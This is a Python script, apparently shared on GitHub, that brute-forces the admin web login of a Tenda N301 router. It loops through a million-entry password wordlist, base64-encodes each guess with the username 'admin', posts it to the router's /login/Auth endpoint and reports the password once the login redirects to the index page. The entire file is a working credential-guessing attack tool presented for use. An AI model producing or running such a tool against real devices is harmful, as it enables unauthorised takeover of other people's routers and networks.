import requests, base64
import time
# BruteForce Router Tenda N301
# Coded by Mugi F.
# Github https://github.com/mugi789
# 2022-04-15

print("""\
    \033[36m
     ___             _         ___                    
    | _ ) _ _  _  _ | |_  ___ | __| ___  _ _  __  ___ 
    | _ \| '_|| || ||  _|/ -_)| _| / _ \| '_|/ _|/ -_)
    |___/|_|   \_._| \__|\___||_|  \___/|_|  \__|\___|\033[35m
     ___              _         _ _  ____ ___  _ 
    |_ _| ___  _ _  _| | ___   | \ |[__ /|   |/ |
     | | / ._]| ' |/ . |[_] |  |   | [_ \| / || |
     |_| \___.|_|_|\___|[___|  |_\_|[___/ \__||_| \033[39m \n""")
# ip = input("Input IP Router : ")
# passwd = input("Input Wordlist : ")

ip  = "192.168.1.1"
passwd = "10-million-password-list-top-1000000.txt"


intervals = 1000
sleep_interval = 60

def count_number_of_lines(filename):
    with open(filename) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

# create a function that calculate how many passwords per minute the program runs
def time_calculator(start_time, end_time):
    time_taken = end_time - start_time
    time_taken = time_taken / 60
    return time_taken 

def brute_force(ip, passwd):
    print("========= Scanning ==========")
    with open(passwd, 'r') as passwords:
        number_of_passwords = count_number_of_lines(passwd)
        counter = 0
        start = time.time()

        for baris in passwords:
            
            password = baris.replace('\n', '')
            encode = base64.b64encode(bytes(password, 'utf-8')).decode('ascii')
            user = base64.b64encode(bytes("admin", 'utf-8')).decode('ascii')

            payload = {
                'username': user,
                'password': encode
            }

            counter += 1
            try:
                login = requests.post('http://'+ ip +'/login/Auth', data=payload, allow_redirects=True)
            except:
                # print sleeping due to connection error
                print("[-] Sleeping for {} seconds".format(sleep_interval))
                time.sleep(sleep_interval)

            if ('http://' + ip + '/index.html' == login.url):
                print("="*30)
                print("\033[32mPassword Found\033[39m : " + password)
                break

            if (counter % intervals == 0):
                percentage_completed = int((counter / number_of_passwords) * 100)

                end = time.time()
                time_taken = time_calculator(start, end)
                password_per_minute = round(counter / time_taken)
                print("\r[{}%] Password checked | {:,} passwords per minute".format(percentage_completed, password_per_minute), end="")

                # estimated time to finish
                estimated_time =  (number_of_passwords - counter) / password_per_minute
                print("\n\n[+] Estimated time to finish: {} minutes".format(round(estimated_time)))
            

def main():
    brute_force(ip, passwd)


if __name__ == "__main__":
    main()
    print("\n\n[+] Done")